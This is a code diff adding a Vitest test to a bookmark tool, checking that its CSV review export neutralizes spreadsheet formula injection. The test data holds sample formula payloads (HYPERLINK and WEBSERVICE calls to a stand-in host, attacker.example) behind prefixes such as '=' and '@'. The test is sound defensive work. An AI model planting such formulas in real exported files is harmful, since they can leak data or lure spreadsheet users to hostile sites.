@@ -2,6 +2,7 @@
 import { describe, expect, it } from 'vitest';
 import { canonicalizeUrl, parseBookmarkHtml, reconcile } from '../src/bookmarks';
 import { exportBookmarkHtml, exportReviewCsv } from '../src/exporters';
+import type { MergeRow } from '../src/types';
 
 const html = (folder: string, links: string) => `<!DOCTYPE NETSCAPE-Bookmark-file-1><DL><p><DT><H3>${folder}</H3><DL><p>${links}</DL><p></DL><p>`;
 
@@ -32,5 +33,19 @@ describe('bookmark parsing and reconciliation', () => {
     expect(exportBookmarkHtml(rows)).toContain('A &amp; B');
     rows[0].included = false;
     expect(exportReviewCsv(rows)).toContain('a-only,false');
+  });
+  it.each(['=', '+', '-', '@', '\t', '\r'])('neutralizes %j spreadsheet formulas in title and folder cells', (prefix) => {
+    const title = `${prefix}HYPERLINK("https://attacker.example/title","Open")`;
+    const folder = `${prefix}WEBSERVICE("https://attacker.example/folder")`;
+    const row: MergeRow = {
+      id: 'https://safe.example/', status: 'a-only', canonical: 'https://safe.example/',
+      title, folder: [folder], included: true, notes: [],
+      items: [{ id: 'a-0', source: 'a', title, url: 'https://safe.example/', canonical: 'https://safe.example/', folder: [folder] }]
+    };
+    const review = exportReviewCsv([row]);
+    expect(review).toContain(`'${prefix}HYPERLINK`);
+    expect(review).toContain(`'${prefix}WEBSERVICE`);
+    expect(review).not.toContain(`,${prefix}HYPERLINK`);
+    expect(review).not.toContain(`,${prefix}WEBSERVICE`);
   });
 });
